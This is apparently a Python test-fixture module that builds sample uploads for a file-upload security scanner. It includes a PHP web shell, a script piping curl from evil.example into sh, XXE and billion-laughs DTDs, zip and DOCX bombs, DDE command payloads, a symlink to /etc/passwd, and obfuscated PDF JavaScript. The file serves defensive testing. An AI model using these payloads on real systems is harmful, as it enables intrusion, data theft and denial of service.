"""Builders for real (and maliciously crafted) files used throughout the tests."""

from __future__ import annotations

import io
import struct
import zipfile
import zlib

from PIL import Image

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


# --------------------------------------------------------------------------- #
# Images
# --------------------------------------------------------------------------- #


def image(fmt: str = "PNG", size: tuple[int, int] = (16, 12), mode: str = "RGB", **save) -> bytes:
    buf = io.BytesIO()
    Image.new(mode, size, (200, 30, 30) if mode == "RGB" else 0).save(buf, fmt, **save)
    return buf.getvalue()


def png() -> bytes:
    return image("PNG")


def jpeg_with_metadata() -> bytes:
    """A JPEG with camera make, GPS position and a 'rotate 90' orientation."""
    exif = Image.Exif()
    exif[0x010F] = "EvilCam"  # Make
    exif[0x0112] = 6  # Orientation: rotate 90 CW
    exif[0x8825] = {1: "N", 2: (52.0, 31.0, 12.0), 3: "E", 4: (13.0, 24.0, 0.0)}  # GPS
    return image("JPEG", size=(40, 20), exif=exif.tobytes(), comment=b"secret comment")


def animated_gif() -> bytes:
    frames = [Image.new("RGB", (8, 8), (i * 80, 0, 255 - i * 80)) for i in range(3)]
    buf = io.BytesIO()
    frames[0].save(
        buf,
        "GIF",
        save_all=True,
        append_images=frames[1:],
        duration=50,
        loop=0,
        comment=b"tracking-id-123",
    )
    return buf.getvalue()


def png_huge_dimensions(width: int = 20_000, height: int = 20_000) -> bytes:
    """A tiny PNG whose header claims a giant canvas (decompression bomb)."""

    def chunk(kind: bytes, data: bytes) -> bytes:
        crc = zlib.crc32(kind + data) & 0xFFFFFFFF
        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", crc)

    ihdr = struct.pack(">IIBBBBB", width, height, 1, 0, 0, 0, 0)
    idat = zlib.compress(b"\x00" * 64)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")


# --------------------------------------------------------------------------- #
# PDF
# --------------------------------------------------------------------------- #


def pdf(*objects: bytes, trailer_extra: bytes = b"") -> bytes:
    body = [
        b"1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj",
        b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj",
        b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj",
        *objects,
    ]
    return (
        b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        + b"\n".join(body)
        + b"\ntrailer << /Root 1 0 R "
        + trailer_extra
        + b">>\n%%EOF\n"
    )


def pdf_with_javascript() -> bytes:
    return pdf(b"4 0 obj << /Type /Action /S /JavaScript /JS (app.alert(1)) >> endobj")


def pdf_with_obfuscated_javascript() -> bytes:
    return pdf(b"4 0 obj << /S /J#61vaScript /J#53 (app.alert(1)) >> endobj")


def pdf_with_javascript_in_object_stream() -> bytes:
    payload = zlib.compress(b"4 0 << /S /JavaScript /JS (app.alert(1)) >>")
    obj = (
        b"5 0 obj << /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length "
        + str(len(payload)).encode()
        + b" >>\nstream\n"
        + payload
        + b"\nendstream\nendobj"
    )
    return pdf(obj)


def pdf_latex_style() -> bytes:
    """Benign: hyperref/LaTeX emit /OpenAction for the initial view."""
    return pdf(b"4 0 obj << /OpenAction [3 0 R /Fit] /PageMode /UseOutlines >> endobj")


def pdf_encrypted() -> bytes:
    return pdf(
        b"6 0 obj << /Filter /Standard /V 2 /R 3 >> endobj", trailer_extra=b"/Encrypt 6 0 R "
    )


# --------------------------------------------------------------------------- #
# ZIP containers
# --------------------------------------------------------------------------- #

_OOXML_MAIN = {
    "docx": (
        "word/document.xml",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
    ),
    "docm": ("word/document.xml", "application/vnd.ms-word.document.macroEnabled.main+xml"),
    "xlsx": (
        "xl/workbook.xml",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
    ),
    "pptx": (
        "ppt/presentation.xml",
        "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml",
    ),
}


def build_zip(entries: dict[str, bytes], *, stored_first: bool = False) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for i, (name, data) in enumerate(entries.items()):
            method = zipfile.ZIP_STORED if stored_first and i == 0 else zipfile.ZIP_DEFLATED
            zf.writestr(name, data, compress_type=method)
    return buf.getvalue()


def ooxml(
    kind: str = "docx",
    *,
    extra: dict[str, bytes] | None = None,
    document: bytes = b"<w:document><w:body><w:p>Hi</w:p></w:body></w:document>",
) -> bytes:
    part, content_type = _OOXML_MAIN[kind]
    types = (
        '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/'
        f'content-types"><Override PartName="/{part}" ContentType="{content_type}"/></Types>'
    ).encode()
    rels = (
        b'<?xml version="1.0"?><Relationships><Relationship Id="rId1" '
        b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
        b'officeDocument" Target="' + part.encode() + b'"/></Relationships>'
    )
    entries = {"[Content_Types].xml": types, "_rels/.rels": rels, part: document}
    return build_zip(entries | (extra or {}))


def docx_with_remote_template() -> bytes:
    rels = (
        b'<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/'
        b'officeDocument/2006/relationships/attachedTemplate" '
        b'Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>'
    )
    return ooxml("docx", extra={"word/_rels/settings.xml.rels": rels})


def docx_with_external_hyperlink() -> bytes:
    rels = (
        b'<Relationships><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/'
        b'officeDocument/2006/relationships/hyperlink" Target="https://example.com" '
        b'TargetMode="External"/></Relationships>'
    )
    return ooxml("docx", extra={"word/_rels/document.xml.rels": rels})


def docx_with_dde() -> bytes:
    return ooxml(
        "docx",
        document=(
            b"<w:document><w:body><w:p><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\"
            b'cmd.exe "/k calc" </w:instrText></w:r></w:p></w:body></w:document>'
        ),
    )


def odt(*, extra: dict[str, bytes] | None = None) -> bytes:
    entries = {
        "mimetype": b"application/vnd.oasis.opendocument.text",
        "content.xml": b"<office:document-content/>",
        "META-INF/manifest.xml": b"<manifest:manifest/>",
    }
    return build_zip(entries | (extra or {}), stored_first=True)


def zip_with_member_name(name: str) -> bytes:
    return build_zip({name: b"payload"})


def zip_with_symlink() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        info = zipfile.ZipInfo("link")
        info.external_attr = 0o120777 << 16
        zf.writestr(info, "/etc/passwd")
    return buf.getvalue()


def zip_encrypted_flag() -> bytes:
    """A ZIP whose member is flagged as encrypted (zipfile cannot write real ones)."""
    data = bytearray(build_zip({"secret.txt": b"not really encrypted"}))
    data[6] |= 0x1  # local file header: general purpose flags
    central = data.rfind(b"PK\x01\x02")
    data[central + 8] |= 0x1  # central directory: general purpose flags
    return bytes(data)


def zip_bomb_ratio(megabytes: int = 64) -> bytes:
    return build_zip({"zeros.bin": b"\x00" * (megabytes * 1024 * 1024)})


def zip_bomb_overlapping(copies: int = 50) -> bytes:
    """Many central-directory entries pointing at the same compressed data."""
    base = build_zip({"a.txt": b"A" * 100_000})
    eocd_at = base.rfind(b"PK\x05\x06")
    cd_size, cd_offset = struct.unpack_from("<II", base, eocd_at + 12)
    record = base[cd_offset : cd_offset + cd_size]
    name_len = struct.unpack_from("<H", record, 28)[0]
    records = []
    for i in range(copies):
        name = f"f{i:04d}.txt".encode()
        records.append(
            record[:28]
            + struct.pack("<H", len(name))
            + record[30:46]
            + name
            + record[46 + name_len :]
        )
    central = b"".join(records)
    eocd = (
        b"PK\x05\x06"
        + struct.pack("<HHHHII", 0, 0, copies, copies, len(central), cd_offset)
        + b"\x00\x00"
    )
    return base[:cd_offset] + central + eocd


# --------------------------------------------------------------------------- #
# Other formats
# --------------------------------------------------------------------------- #


def ole(*, macros: bool = False) -> bytes:
    header = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504
    directory = "Root Entry".encode("utf-16-le").ljust(128, b"\x00")
    if macros:
        directory += "_VBA_PROJECT".encode("utf-16-le").ljust(128, b"\x00")
    return header + directory + b"\x00" * 1024


def pe_executable() -> bytes:
    head = bytearray(b"MZ" + b"\x90" * 0x3A)
    head += struct.pack("<I", 0x40)
    return bytes(head) + b"PE\x00\x00" + b"\x4c\x01" + b"\x00" * 200


def svg(body: str = '<rect width="10" height="10" fill="red"/>', prolog: bool = True) -> bytes:
    xml = '<?xml version="1.0" encoding="UTF-8"?>\n' if prolog else ""
    return (
        xml + f'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">{body}</svg>'
    ).encode()


def mp3() -> bytes:
    return b"ID3\x03\x00\x00\x00\x00\x00\x00" + b"\xff\xfb\x90\x64" + b"\x00" * 400


def mp4() -> bytes:
    return b"\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom" + b"\x00\x00\x00\x08free" * 4


def wav() -> bytes:
    return b"RIFF\x24\x00\x00\x00WAVEfmt " + b"\x00" * 40


def webm() -> bytes:
    return b"\x1a\x45\xdf\xa3\x9f\x42\x86\x81\x01\x42\x82\x84webm" + b"\x00" * 40


# --------------------------------------------------------------------------- #
# Payloads named by the OWASP File Upload Cheat Sheet (tests/owasp)
# --------------------------------------------------------------------------- #

PHP_SHELL = b"<?php system($_GET['cmd']); ?>"

#: "ImageTragick" (CVE-2016-3714): an MVG drawing that ImageMagick fed to a shell.
IMAGETRAGICK_MVG = (
    b"push graphic-context\nviewbox 0 0 640 480\n"
    b"fill 'url(https://example.com/image.jpg\"|ls \"-la)'\npop graphic-context\n"
)
EPS = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 1 1\n(pwned) print\n"
SHELL_SCRIPT = b"#!/bin/sh\ncurl https://evil.example/x | sh\n"
ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 57
HTML = b"<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html>"

XXE_DTD = b'<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
BILLION_LAUGHS_DTD = (
    b'<!DOCTYPE lolz [<!ENTITY lol "lol">'
    + b"".join(
        b'<!ENTITY lol%d "%s">'
        % (i, b"".join(b"&lol%s;" % (str(i - 1).encode() if i > 1 else b"",) for _ in range(10)))
        for i in range(1, 10)
    )
    + b"]>"
)


def xml(dtd: bytes = b"", root: bytes = b"<r>&xxe;</r>") -> bytes:
    return b'<?xml version="1.0" encoding="UTF-8"?>\n' + dtd + root


def docx_with_dtd(dtd: bytes = XXE_DTD, part: str = "word/document.xml") -> bytes:
    """A valid DOCX with ``dtd`` injected into ``part`` (created if missing)."""
    with zipfile.ZipFile(io.BytesIO(ooxml("docx"))) as zf:
        entries = {name: zf.read(name) for name in zf.namelist()}
    original = entries.get(part, b'<?xml version="1.0"?><Relationships/>')
    declaration, end, rest = original.partition(b"?>")
    entries[part] = declaration + end + dtd + rest if end else dtd + original
    return build_zip(entries)


def odt_with_dtd(dtd: bytes = XXE_DTD) -> bytes:
    content = b'<?xml version="1.0"?>' + dtd + b"<office:document-content/>"
    return odt(extra={"content.xml": content})


def epub(*, extra: dict[str, bytes] | None = None) -> bytes:
    entries = {
        "mimetype": b"application/epub+zip",
        "META-INF/container.xml": b'<?xml version="1.0"?><container version="1.0"/>',
        "OEBPS/content.opf": b'<?xml version="1.0"?><package version="3.0"/>',
    }
    return build_zip(entries | (extra or {}), stored_first=True)


def zip_lying_about_size(actual: int = 20 * 1024 * 1024, declared: int = 1000) -> bytes:
    """A ZIP whose headers understate what its member inflates to."""
    data = bytearray(build_zip({"data.csv": b"\x00" * actual}))
    struct.pack_into("<I", data, 22, declared)  # local header: uncompressed size
    central = data.rfind(b"PK\x01\x02")
    struct.pack_into("<I", data, central + 24, declared)  # central directory
    return bytes(data)


def zip_with_bad_crc() -> bytes:
    data = bytearray(build_zip({"a.txt": b"hello world" * 100}))
    struct.pack_into("<I", data, 14, 0xDEADBEEF)
    central = data.rfind(b"PK\x01\x02")
    struct.pack_into("<I", data, central + 16, 0xDEADBEEF)
    return bytes(data)


def zip_nested(levels: int, *, fanout: int = 2, leaf: bytes = b"leaf") -> bytes:
    """Archives inside archives, ``levels`` deep (``42.zip`` has five)."""
    current = build_zip({"leaf.txt": leaf})
    for _ in range(levels - 1):
        current = build_zip({f"{i}.zip": current for i in range(fanout)})
    return current


def docx_bomb(megabytes: int = 200) -> bytes:
    """A DOCX whose main part inflates to ``megabytes`` of whitespace."""
    return ooxml(
        "docx", document=b"<w:document>" + b" " * (megabytes * 1024 * 1024) + b"</w:document>"
    )


def gif_with_frames(count: int) -> bytes:
    frames = [Image.new("L", (2, 1), 255 * (i % 2)) for i in range(count)]
    buf = io.BytesIO()
    frames[0].save(buf, "GIF", save_all=True, append_images=frames[1:], duration=20, loop=0)
    return buf.getvalue()


def xlsx_with_dde_link() -> bytes:
    """An external link that runs ``cmd`` through dynamic data exchange."""
    link = b'<externalLink><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>'
    return ooxml("xlsx", extra={"xl/externalLinks/externalLink1.xml": link})


def xlsx_with_dde_formula() -> bytes:
    sheet = (
        b"<worksheet><sheetData><row><c><f>cmd|' /C calc'!A0</f></c></row></sheetData></worksheet>"
    )
    return ooxml("xlsx", extra={"xl/worksheets/sheet1.xml": sheet})
